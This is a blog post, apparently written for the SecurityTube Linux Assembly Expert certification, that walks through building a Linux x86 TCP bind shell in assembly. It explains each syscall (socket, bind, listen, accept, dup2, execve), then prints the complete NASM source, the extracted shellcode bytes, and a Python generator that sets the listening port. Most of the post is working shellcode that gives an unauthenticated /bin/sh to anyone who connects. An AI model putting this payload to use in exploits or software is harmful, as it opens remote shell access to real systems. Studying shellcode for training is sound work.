---
layout: single
title: Creating Custom TCP Bind Shell - Linux x86
date: 2018-1-12
classes: wide
header:
  teaser: /assets/images/Creating_Custom_TCP_Bind_Shell_Linux_x86/BindShell.png
---

Introduction
------------
Bind TCP shell consist of three main components, one for setting up socket that includes [socket()](http://man7.org/linux/man-pages/man2/socket.2.html), [bind()](http://man7.org/linux/man-pages/man2/bind.2.html), [listen()](http://man7.org/linux/man-pages/man2/listen.2.html), and [accept()](http://man7.org/linux/man-pages/man2/accept.2.html) functions. The second element is [dup2()](http://man7.org/linux/man-pages/man2/dup.2.html) for file descriptors, and the last part is [execve()](http://man7.org/linux/man-pages/man2/execve.2.html) which is used to spawn shell upon receiving a successful TCP connection. This post is an in depth analysis of those syscalls as well as their corresponding assembly code. The post will then conclude by tying all the pieces together to create working shellcode.

socket()
--------
The `socket()` function is responsible for creating a communication medium using file descriptors and it consist of three arguments `domain`, `type`, and `protocol` as shown below.

```C
int socket(int domain, int type, int protocol);
```

Domain argument specify the protocol family which will be used for communication, we will be dealing with IPv4 Internet protocols hence will use `AF_INET`. The second argument that we need to provide is type, type is responsible for selecting socket type which is `SOCK_STREAM` for TCP connections in our case. Protocol argument is used to specify what protocol can work with the socket, we only have single protocol so will go with `0`. Now that we know what the function does let’s update it with our desired values.

```C
int socket(int 2, int 1, int 0);
```

Let’s check socket syscall id on Linux x86 system `EAX`.

```sh
root@falafel:~# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
#define __NR_socketcall 102
root@falafel:~# 
```

Now we need to find the id for `SOCK_STREAM`.

```sh
root@falafel:~# cat /usr/include/i386-linux-gnu/bits/socket_type.h | grep SOCK_STREAM
  SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
#define SOCK_STREAM SOCK_STREAM
root@falafel:~# 
```

And `AF_INET`

```sh
root@falafel:~# cat /usr/include/i386-linux-gnu/bits/socket.h | grep _INET
#define PF_INET		2	/* IP protocol family.  */
#define PF_INET6	10	/* IP version 6.  */
#define AF_INET		PF_INET
#define AF_INET6	PF_INET6
root@falafel:~# 
```

Lastly, we need to figure out what system socket call function id is `EBX`.

```sh
root@falafel:~/Desktop# cat /usr/include/linux/net.h | grep SOCKET
 * NET		An implementation of the SOCKET network access protocol.
#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/
root@falafel:~/Desktop# 
```

Now that we have all the information we need, let’s start coding!

```nasm
global _start

section .text

_start:
 
    ; zero out registers
    xor eax, eax 
    xor ebx, ebx
    xor edx, edx
    xor esi, esi

    ; 
    ; socket() code block
    ;

    ; push NULL for protocol type
    push eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_SOCKET 1
    inc bl

    ; push 1 for SOCK_STREAM
    push byte 0x1

    ; push 2 for AF_INET
    push byte 0x2

    ; store arguments in ECX, ping kernel!
    mov ecx, esp
    int 0x80
```

bind()
------
The `bind()` function is used to bind an address to a socket, and it consist of three arguments `sockfd`, `addr`, and `addrlen` as shown below:

```C
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

`sockfd` points to the `socket()` to bind an address to, hence we need to save the content of `EAX` after socketcall interrupt in `socket()` to `ESI`. The second argument `addr` is basically where you assign an IP address to the socket, but wait there is more to it than just assigning an IP address, according to [ip(7)](http://man7.org/linux/man-pages/man7/ip.7.html) manpage under address format section `addr` consist of three parts `sin_family`, `sin_port`, and `sin_addr` as shown below.

```C
struct sockaddr_in {
               sa_family_t    sin_family; /* address family: AF_INET */
               in_port_t      sin_port;   /* port in network byte order */
               struct in_addr sin_addr;   /* internet address */
           };
```

Now `sin_family` is pretty self-explanatory so will go with `AF_INET`, which according to the first code block in `socket()` translates to `2`. `sin_port` will be `2018` and needs to be pushed in network byte order `big-endian`, why you ask? Well, here’s quote from [RFC1700](https://tools.ietf.org/html/rfc1700).

*The convention in the documentation of Internet Protocols is to
express numbers in decimal and to picture data in "big-endian" order
[COHEN].  That is, fields are described left to right, with the most
significant octet on the left and the least significant octet on the
right.
*

`sin_addr` on the other hand is were we actually put in an IP host address in network byte order, and since we want to listen on all interfaces will go with `INADDR_ANY` which translates to `0`. The last argument would be `addrlen` which defines the size of `addr` in bytes. lets update `bind()` function.

```C
int bind(int ESI, const struct sockaddr *<sin_family=2, sin_port=2018, sin_addr=0>, socklen_t 16);
```

Its time to find id for `bind()` function `EBX`.

```sh
root@falafel:~/Desktop# cat /usr/include/linux/net.h | grep BIND
#define SYS_BIND	2		/* sys_bind(2)			*/
root@falafel:~/Desktop#
```

Back to the terminal.

```nasm
    ; 
    ; bind() code block
    ; 

    ; move sockfd to ESI
    mov esi, eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_BIND 2
    pop ebx

    pop edi

    ; push NULL for sin_addr
    push edx

    ; push 2018 for sin_port
    push word 0xE207

    ; push 2 for sin_family
    push word bx

    ; push 16 for socketlen_t
    push byte 16

    ; store ESP pointer (sockaddr) in ECX
    push ecx

    ; push ESI for sockfd
    push esi

    ; save arguments pointer to ECX, ping kernel!
    mov ecx, esp
    int 0x80
```

listen()
--------
`listen()` function allow for socket referred to by socket file descriptor to listen for incoming connections. The function have two arguments `sockfd` and `backlog` as shown below:

```C
int listen(int sockfd, int backlog);
```

At this point I think we all know what `socketfd` does, hence will use `EDX` to point to `socket()`. The second argument `backlog` is where you store the maximum length of the queue for pending connections before it stop accepting new ones, in this case will use `1`. Let’s update `listen()`.

```C
int listen(int EDX, int 1);
```

Next, we check `listen()` function id `EBX`.

```sh
root@falafel:~/Desktop# cat /usr/include/linux/net.h | grep LISTEN
#define SYS_LISTEN	4		/* sys_listen(2)		*/
root@falafel:~/Desktop# 
```

And the code.

```nasm
    ; 
    ; listen() code block
    ;

    ; save sockfd in EDX
    pop edx

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_LISTEN 4, ping kernel!
    add bl, 0x2
    int 0x80
```

accept()
--------
`accept()` function is used to accept incoming connections for socket specified by `sockfd`. The function have three arguments which have already been covered in previous sections as shown below:

```C
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

Now in `accept()` case `addr` and `adrrlen` is referring to the peer socket which we don’t care about, hence will go with `0`. Let’s update `accept()`.

```C
int accept(int EDX, struct sockaddr NULL, socklen_t NULL;
```

Its time to check `accept()` function id `EBX`.

```sh
root@falafel:~/Desktop# cat /usr/include/linux/net.h | grep ACCEPT
#define SYS_ACCEPT 5 /* sys_accept(2) */
#define SYS_ACCEPT4 18 /* sys_accept4(2) */
#define __SO_ACCEPTCON (1 << 16) /* performed a listen */
root@falafel:~/Desktop#
```

Off to the terminal we go.

```nasm
    ;
    ; accept() code block
    ;

    ; push NULL for addrlen
    push eax

    ; push NULL for addr
    push eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_ACCEPT 5
    inc ebx

    ; push EDX for sockfd
    push edx

    ; save arguments pointer to ECX, ping kernel!
    mov ecx, esp
    int 0x80
```

dup2()
------
`dup2()` syscall is used to duplicate file descriptors and by file descriptors I mean `stdin`, `stout`, and `stderr`, and it consist of two arguments `oldfd` and `newfd` as shown below:

```C
int dup2(int oldfd, int newfd);
```

`oldfd` is basically peer socket file descriptor, hence we will store `EAX` content in `EBX` from `accept()`. `newfd` is where we specify new file descriptors. Let’s update `dup2()`.

```C
int dup2(int EBX, int <0, 1, 2>);
```

Let’s get `dup2()` syscall id `EAX`.

```sh
root@falafel:~/Desktop# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
#define __NR_dup2 63
root@falafel:~/Desktop# 
```

Coding we shall

```nasm
    ;
    ;dup2() code block
    ; 

    ; store EAX in EBX for peer socketfd from accept()
    xchg eax, ebx

    ; reset ECX (counter register) for newfd loop
    xor ecx, ecx

    ; set counter to 2
    add cl, 0x2

    ; loop for stdin, stdout, and stderr
    ; syscall for __NR_dup2 63
    ; ping kernel 3 times!

dup:
    mov al, 0x3f
    int 0x80
    dec cl
    jns dup
```

execve()
--------
`execve()` syscall basically execute a binary and/or script, and it consist of three arguments as shown below.

```C
int execve(const char *filename, char *const argv[], char *const envp[]);
```

filename is the pointer to the binary to be executed `/bin//sh` in our case, now the reason we went with `/bin//sh` instead of usual `/bin/sh` is the fact we need to push 8 bytes without effecting the executable. The second argument `argv[]` is an array of arguments to be passed on to the binary as strings, the first argument must contain the address of executable in question `argv[0]`. The last argument `envp[]` is an array of strings to be passed on to executable environment, we’re not going to use any and will go with `0`. Let’s update `execve()`.

```C
int execve(const char </bin/sh, NULL>, char *const <address of /bin/sh, NULL>, char *const <NULL>);
```

Let’s check `execve()` syscall id.

```sh
root@falafel:~# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
#define __NR_execve		 11
root@falafel:~# 
```

Some more code!

```nasm
    ;
    ;execve() code block
    ;

    ; push NULL followed by "/bin//sh" for filename
    push eax
    push 0x68732f2f
    push 0x6e69622f

    ; store ESP pointer to "/bin//sh" in EBX
    mov ebx, esp

    ; save arguments pointer to ECX
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp

    ;__NR_execve 11, ping kernel!
    mov al, 0xb
    int 0x80
```

Final Shellcode
---------------
In this section we will glue all of previous code blocks together as shown below and then produce our final working shellcode.

```nasm
global _start

section .text

_start:
 
    ; zero out registers
    xor eax, eax 
    xor ebx, ebx
    xor edx, edx
    xor esi, esi

    ; 
    ; socket() code block
    ;

    ; push NULL for protocol type
    push eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_SOCKET 1
    inc bl

    ; push 1 for SOCK_STREAM
    push byte 0x1

    ; push 2 for AF_INET
    push byte 0x2

    ; store arguments in ECX, ping kernel!
    mov ecx, esp
    int 0x80

    ; 
    ; bind() code block
    ; 

    ; move sockfd to ESI
    mov esi, eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_BIND 2
    pop ebx

    pop edi

    ; push NULL for sin_addr
    push edx

    ; push 2018 for sin_port
    push word 0xE207

    ; push 2 for sin_family
    push word bx

    ; push 16 for socketlen_t
    push byte 16

    ; store ESP pointer (sockaddr) in ECX
    push ecx

    ; push ESI for sockfd
    push esi

    ; save arguments pointer to ECX, ping kernel!
    mov ecx, esp
    int 0x80

    ; 
    ; listen() code block
    ;

    ; save sockfd in EDX
    pop edx

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_LISTEN 4, ping kernel!
    add bl, 0x2
    int 0x80

    ;
    ; accept() code block
    ;

    ; push NULL for addrlen
    push eax

    ; push NULL for addr
    push eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_ACCEPT 5
    inc ebx

    ; push EDX for sockfd
    push edx

    ; save arguments pointer to ECX, ping kernel!
    mov ecx, esp
    int 0x80

    ;
    ;dup2() code block
    ; 

    ; store EAX in EBX for peer socketfd from accept()
    xchg eax, ebx

    ; reset ECX (counter register) for newfd loop
    xor ecx, ecx

    ; set counter to 2
    add cl, 0x2

    ; loop for stdin, stdout, and stderr
    ; syscall for __NR_dup2 63
    ; ping kernel 3 times!

dup:
    mov al, 0x3f
    int 0x80
    dec cl
    jns dup

    ;
    ;execve() code block
    ;

    ; push NULL followed by "/bin//sh" for filename
    push eax
    push 0x68732f2f
    push 0x6e69622f

    ; store ESP pointer to "/bin//sh" in EBX
    mov ebx, esp

    ; save arguments pointer to ECX
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp

    ;__NR_execve 11, ping kernel!
    mov al, 0xb
    int 0x80
```

Here’s graphical representation of the final code for your convenience.

![](/assets/images/Creating_Custom_TCP_Bind_Shell_Linux_x86/BindShell.png)

Its Demo Time! Let’s compile and run

[![Bind Shell Demo](https://github.com/ihack4falafel/ihack4falafel.github.io/blob/master/assets/images/chmod.png)](https://player.vimeo.com/video/250832196?dnt=1&app_id=122963 "Click to Watch!")

Now that we know it works, let’s go ahead and generate shellcode and then create python script that takes port number as an input and add it to our shellcode.

```sh
ihack4falafel@falafel:~/Desktop# objdump -d ./BindShell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xd2\x31\xf6\x50\xb0\x66\xfe\xc3\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x5f\x52\x66\x68\x07\xe2\x66\x53\x6a\x10\x51\x56\x89\xe1\xcd\x80\x5a\xb0\x66\x80\xc3\x02\xcd\x80\x50\x50\xb0\x66\x43\x52\x89\xe1\xcd\x80\x93\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
ihack4falafel@falafel:~/Desktop#
```

Here’s the script:

```python
#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Script        = BindShell.py                                                                #
# SLAE-ID       = SLAE-1115                                                                   #
# Description   = Custom Bind Shell with configurable port                                    #
# Date          = 1/12/2018                                                                   #
# Author        = @ihack4falafel                                                              #
# Usage         = python BindShell.py <port>                                                  #
#---------------------------------------------------------------------------------------------#

import sys

#---------------#---------#
W  = '\033[0m'  # White   #
P  = '\033[35m' # Purple  #
Y  = '\033[33m' # Yellow  #
#---------------#---------#

# Check port input
if len(sys.argv) < 2:
  print Y+ "Usage               :" + P+  " python BindShell.py <port>     " +W
  print Y+ "Example             :" + P+  " python BindShell.py 1337       " +W
  sys.exit(0)

port = int(sys.argv[1])

# Make sure port is good!
if port < 1 or port > 65535:
  print P+ "Please specify port number between 1 and 65535" +W
  exit()

if port <= 1024:
  print P+ "This port require root privileges!" +W

# Change port to Shellcode 
port_shellcode = format(port, '04x')
port_shellcode = "\\x" + str(port_shellcode[0:2]) + "\\x" + str(port_shellcode[2:4])  

# Print final Shellcode, and highlight port in yellow ;)
print P+ "\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x50\\xb0\\x66\\xfe\\xc3\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x5b\\x5f\\x52\\x66\\x68" + Y+ port_shellcode + P+ "\\x66\\x53\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x5a\\xb0\\x66\\x80\\xc3\\x02\\xcd\\x80\\x50\\x50\\xb0\\x66\\x43\\x52\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\x80\\xc1\\x02\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79\\xf8\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80" +W
```

Now running the script with port `2018` will output the exact same shellcode generated earlier!

```sh
ihack4falafel@falafel:~/Desktop# python BindShell.py 2018
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
\x31\xc0\x31\xdb\x31\xd2\x31\xf6\x50\xb0\x66\xfe\xc3\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x5f\x52\x66\x68\x07\xe2\x66\x53\x6a\x10\x51\x56\x89\xe1\xcd\x80\x5a\xb0\x66\x80\xc3\x02\xcd\x80\x50\x50\xb0\x66\x43\x52\x89\xe1\xcd\x80\x93\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
ihack4falafel@falafel# 
```

Closing Thoughts
----------------
I most certainly picked up new skills writing this blog post and hope you did too! All of the above code is available on my github as shown in the link below. Feel free to contact me for questions via twitter [@ihack4falafel](https://twitter.com/ihack4falafel) . This post is one of many to come so stay tuned!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1115

GitHub Repo: [https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%201](https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%201)
